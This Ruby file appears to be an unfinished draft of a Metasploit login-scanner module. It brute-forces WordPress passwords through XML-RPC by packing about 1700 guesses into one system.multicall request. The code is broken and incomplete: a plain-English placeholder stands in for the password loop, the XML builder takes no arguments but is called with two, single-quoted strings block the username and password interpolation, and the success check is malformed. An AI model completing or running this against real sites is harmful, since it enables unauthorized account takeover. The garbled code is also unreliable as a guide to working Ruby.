require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner

      # Wordpress XML RPC login scanner
      class WordpressRPC < HTTP

        # (see Base#attempt_login)
        def attempt_login(credential)
          http_client = Rex::Proto::Http::Client.new(
              host, port, {'Msf' => framework, 'MsfExploit' => framework_module}, ssl, ssl_version, proxies
          )
          configure_http_client(http_client)

          result_opts = {
              credential: credential,
              host: host,
              port: port,
              protocol: 'tcp'
          }
          if ssl
            result_opts[:service_name] = 'https'
          else
            result_opts[:service_name] = 'http'
          end

          begin
            http_client.connect

            request = http_client.request_cgi(
                'uri' => uri,
                'method' => method,
                'data' => generate_xml_request(credential.public,credential.private),
            )
            response = http_client.send_recv(request)

            if response && response.code == 200 && response.body =~ /<value><int>401<\/int><\/value>/ || response.body =~ /<name>user_id<\/name>/
              result_opts.merge!(status: Metasploit::Model::Login::Status::SUCCESSFUL, proof: response)
            elsif response.body =~ /<value><int>-32601<\/int><\/value>/
              result_opts.merge!(status: Metasploit::Model::Login::Status::UNABLE_TO_CONNECT)
            else
              result_opts.merge!(status: Metasploit::Model::Login::Status::INCORRECT, proof: response)
            end
          rescue ::EOFError, Rex::ConnectionError, ::Timeout::Error => e
            result_opts.merge!(status: Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof: e)
          end

          Result.new(result_opts)

        end

        # This method generates the XML data for the RPC login request
        # @param user [String] the username to authenticate with
        # @param pass [String] the password to authenticate with
        # @return [String] the generated XML body for the request
        def generate_xml_request()
            # read username from datastore
            # read 1700 passwords from datastore
            xml = '<?xml version="1.0"?>'
            xml << '<methodCall>'
            xml << '<methodName>system.multicall</methodName>'
            xml << '<params>'
            xml << '<param>'
            xml << '<value><array>'
            xml << '<data><value>'
            # for loop datastore password make file with 1700 password attempt lines here'
            SOME FOR LOOP THNIG IN RUBY TO ITERATE THE 1700 passwords
              xml << '<struct>'
              xml << '<member>'
              xml << '<name>methodName</name>'
              xml << '<value><string>wp.getAuthors</string></value>'
              xml << '</member>'
              xml << '<member>'
              xml << '<name>params</name>'
              xml << '<value><array><data>'
              xml << '<value><string>1</string></value>'
              xml << '<value><string>#{user}</string></value>'
              xml << '<value><string>#{pass}</string></value>'
              xml << '</data></array></value>'
              xml << '</member>'
              xml << '</struct>'		
            xml << '</value></data>'
            xml << '</array></value>'
            xml << '</param>'
            xml << '</params>'
            xml << '</methodCall>'
            xml
        end

        # (see Base#set_sane_defaults)
        def set_sane_defaults
          @method = "POST".freeze
          super
        end

      end
    end
  end
end



